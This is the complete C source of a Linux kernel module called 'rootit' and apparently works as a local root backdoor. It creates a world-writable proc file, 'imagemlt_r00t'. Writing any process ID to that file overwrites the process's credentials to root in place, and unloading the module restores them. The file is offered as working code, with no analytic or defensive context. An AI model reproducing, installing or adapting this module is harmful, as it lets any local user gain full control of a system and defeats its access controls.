/*
 * rootit.c
 *
 *
 * This program is free software; you can redistribute it and/or modify
 * it under the terms of the GNU General Public License version 2 as
 * published by the Free Software Foundation.
 */
#include <linux/kernel.h>
#include <linux/types.h>
#include <linux/export.h>
#include <linux/kthread.h>
#include <linux/module.h>

#include <linux/debugfs.h>
#include <linux/proc_fs.h>
#include <linux/uaccess.h>
#include <linux/cred.h>

#include <linux/slab.h>

static struct proc_dir_entry *proc_root;
static struct proc_dir_entry * rootit;
static struct cred *cred_back;
static struct task_struct *task;
static ssize_t imagemlt_rootit_write(struct file *file, const char __user *buffer,
                                    size_t count, loff_t *data)
{
    char *buf;
    struct cred *cred;
    struct task_struct *tasklist,*p;
    struct list_head *pos;
    int i,res;   
    tasklist=&init_task;
    if (count < 1)
        return -EINVAL;

    buf = kmalloc(count, GFP_KERNEL);
    if (!buf)
        return -ENOMEM;

    if (copy_from_user(buf, buffer, count)) {
        kfree(buf);
        return -EFAULT;
    }
    res=0;
    for(i=0;i<count;i++){
	if(*(buf+i)==0 || *(buf+i)>'9' || *(buf+i)<'0')break;
	printk("%d\n",*(buf+i));
	res=res*10+(*(buf+i)-'0');
    }
    printk("pid you wannted is %d",res);
    list_for_each(pos,&tasklist->tasks){
        p=list_entry(pos,struct task_struct,tasks);
    	//if(!strncmp(p->comm,(char*)buf,strlen(p->comm))){
    	if(p->pid==res){
        	task = p;
        	cred = (struct cred *)__task_cred(task);
        	memcpy(cred_back, cred, sizeof(struct cred));

        	cred->uid = GLOBAL_ROOT_UID;
        	cred->gid = GLOBAL_ROOT_GID;
        	cred->suid = GLOBAL_ROOT_UID;
        	cred->euid = GLOBAL_ROOT_UID;
        	cred->euid = GLOBAL_ROOT_UID;
        	cred->egid = GLOBAL_ROOT_GID;
        	cred->fsuid = GLOBAL_ROOT_UID;
        	cred->fsgid = GLOBAL_ROOT_GID;
        	printk("now task %s are root\n",p->comm);
		break;
    	}
    }
    kfree(buf);
    return count;
}


ssize_t imagemlt_rootit_read(struct file *file, char __user *buf, size_t size, loff_t *ppos)
{
    printk("root any pid!\n");
    return 0;
}

static int imagemlt_rootit_open(struct inode *inode, struct file *file)
{
    return 0;
}

static const struct file_operations proc_fops = {
    .open= imagemlt_rootit_open,
    .read= imagemlt_rootit_read,
    .write = imagemlt_rootit_write,
};

static int imagemlt_root_procfs_attach(void)
{
    proc_root = proc_mkdir("imagemlt_r00t", NULL);
    rootit= proc_create("imagemlt_r00t", 0666, proc_root, &proc_fops);
    if (IS_ERR(rootit)){
        printk("create imagemlt_r00t dir error\n");
        return -1;
    }
    return 0;

}

static int __init imagemlt_r00t_init(void)
{
    int ret;
    cred_back = kmalloc(sizeof(struct cred), GFP_KERNEL);
    if (IS_ERR(cred_back))
        return PTR_ERR(cred_back);

    ret = imagemlt_root_procfs_attach();
    printk("===fe3o4==== imagemlt_root_procfs_attach ret:%d\n", ret);
    if(ret){
        printk("===fe3o4== imagemlt_root_procfs_attach failed===\n ");
    }
    return 0;
}

static void __exit imagemlt_r00t_exit(void)
{
    if(task!=NULL && task->mm!=NULL){
        struct cred *cred = (struct cred *)__task_cred(task);
        memcpy(cred, cred_back, sizeof(struct cred));
    }
    kfree(cred_back);

    remove_proc_entry("imagemlt_r00t", proc_root);
    remove_proc_entry("imagemlt_r00t", NULL);
    printk("proc %s nolonger be root ",task->comm);
}

module_init(imagemlt_r00t_init);
module_exit(imagemlt_r00t_exit);
MODULE_LICENSE("GPL");

